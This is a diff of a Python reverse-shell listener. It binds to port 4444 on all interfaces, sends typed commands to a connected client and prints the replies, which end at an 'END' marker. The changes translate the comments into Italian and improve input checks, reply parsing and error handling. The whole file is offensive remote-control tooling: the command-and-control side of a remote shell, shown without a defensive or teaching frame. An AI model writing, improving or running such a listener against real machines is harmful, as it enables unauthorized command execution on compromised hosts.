@@ -1,8 +1,8 @@
 import socket
-import base64
 
+# Creazione del socket
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-port = 4444  # Chosen port
+port = 4444  # Porta scelta
 lhost = "0.0.0.0"
 s.bind((lhost, port))
 s.listen(1)
@@ -12,30 +12,36 @@ print(f"[+] Connection accepted {addr}")
 
 while True:
     try:
-        cmd = input("> ")  # Wait for user input for the command
-        conn.sendall(cmd.encode())  # Send the command to the client
+        # Input del comando da inviare al client
+        cmd = input("> ")
+        if not cmd.strip():  # Controlla se il comando è vuoto
+            continue
         
-        # Receive all data from the client
-        full_data = b""  # Initialize an empty byte string
+        conn.sendall(cmd.encode())  # Invia il comando al client
+
+        # Ricezione dei dati dal client
+        full_data = b""  # Inizializza una stringa vuota di byte
         while True:
-            data = conn.recv(1024)  # Receive data from the client
-            if not data:  # If no more data is received, break the loop
+            data = conn.recv(1024)  # Ricevi fino a 1024 byte
+            if not data or b'END' in data:  # Interrompi se non ci sono più dati o trovi 'END'
+                full_data += data.replace(b'END', b'')  # Rimuovi 'END' dai dati ricevuti
                 break
-            full_data += data  # Append received data
-            
-            # Check if we received the termination signal
-            if b'END' in data:  # Assuming 'END' is sent by the client to indicate end of transmission
-                break
+            full_data += data
 
         if full_data:
-            # Remove the termination signal from the received data
-            full_data = full_data.replace(b'END', b'')
-            # Decode the Base64 response before printing it
-            decoded_data = full_data.decode('utf-8') 
-            print(decoded_data)  # Print the client's response
+            try:
+                # Decodifica dei dati ricevuti in UTF-8, sostituendo i caratteri non validi con '*'
+                decoded_data = full_data.decode('utf-8', errors='replace')
+                print(decoded_data)  # Stampa la risposta del client
             
-    except SyntaxError:
-        print("[!] ERROR!")
+            except Exception as e:
+                print(f"[!] An error occurred during decoding: {e}")
+
+    except KeyboardInterrupt:
+        print("\n[!] Exiting...")
+        break
+    except Exception as e:
+        print(f"[!] An error occurred: {e}")
 
 print("Closing connection")
 conn.close()
